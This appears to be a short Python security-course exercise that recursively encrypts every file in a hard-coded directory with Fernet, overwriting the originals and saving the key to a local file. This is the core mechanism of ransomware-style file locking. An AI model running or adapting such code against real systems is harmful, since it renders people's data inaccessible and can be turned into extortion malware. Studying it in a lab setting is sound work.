from cryptography.fernet import Fernet
import os
import glob

director = os.path.expanduser('D:\Scoala\SSI\Dictionary\cript')
#print(director)
#files = glob.glob(f'{director}\\**\\*.*', recursive=True)
#for file in files:
#    print(file)


key = Fernet.generate_key()

with open("key.key","wb")as keyFile:
    keyFile.write(key)

files = glob.glob(f'{director}\\**\\*.*', recursive=True)
fernet = Fernet(key)

for file in files:
    
    with open(file,"rb") as tf:
        tf_bytes = tf.read()

    tf_bytes_enc= fernet.encrypt(tf_bytes)

    with open(file,"wb") as tf:
        tf.write(tf_bytes_enc)
